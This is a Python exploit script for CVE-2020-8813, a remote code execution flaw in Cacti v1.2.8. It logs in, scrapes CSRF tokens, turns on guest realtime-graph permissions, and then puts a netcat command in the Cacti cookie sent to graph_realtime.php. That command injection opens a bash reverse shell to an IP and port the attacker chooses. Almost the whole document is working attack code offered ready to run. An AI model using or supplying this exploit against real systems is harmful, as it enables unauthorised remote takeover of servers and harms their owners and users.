#!/usr/bin/python3

# Exploit Title: Cacti v1.2.8 Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
    print("[~] Usage : ./Cacti-exploit.py url username password ip port")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

def login(token):
    login_info = {
    "login_username": username,
    "login_password": password,
    "action": "login",
    "__csrf_magic": token
    }
    login_request = request.post(url+"/index.php", login_info)
    login_text = login_request.text
    if "Invalid User Name/Password Please Retype" in login_text:
        return False
    else:
        return True

def enable_guest(token):
    request_info = {
    "id": "3",
    "section25": "on",
    "section7": "on",
    "tab": "realms",
    "save_component_realm_perms": 1,
    "action": "save",
    "__csrf_magic": token
    }
    enable_request = request.post(url+"/user_admin.php?header=false", request_info)
    if enable_request:
        return True
    else:
        return False

def send_exploit():
    payload = ";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % (ip, port)
    cookies = {'Cacti': quote(payload)}
    requests.get(url+"/graph_realtime.php?action=init", cookies=cookies)

request = requests.session()
print("[+]Retrieving login CSRF token")
page = request.get(url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content, "html5lib")
token = soup.findAll('input')[0].get("value")
if token:
    print("[+]Token Found : %s" % token)
    print("[+]Sending creds ..")
    login_status = login(token)
    if login_status:
        print("[+]Successfully LoggedIn")
        print("[+]Retrieving CSRF token ..")
        page = request.get(url+"/user_admin.php?action=user_edit&id=3&tab=realms")
        html_content = page.text
        soup = BeautifulSoup(html_content, "html5lib")
        token = soup.findAll('input')[1].get("value")
        if token:
            print("[+]Making some noise ..")
            guest_realtime = enable_guest(token)
            if guest_realtime:
                print("[+]Sending malicous request, check your nc ;)")
                send_exploit()
            else:
                print("[-]Error while activating the malicous account")

        else:
            print("[-] Unable to retrieve CSRF token from admin page!")
            exit()

    else:
        print("[-]Cannot Login!")
else:
    print("[-] Unable to retrieve CSRF token!")
    exit()
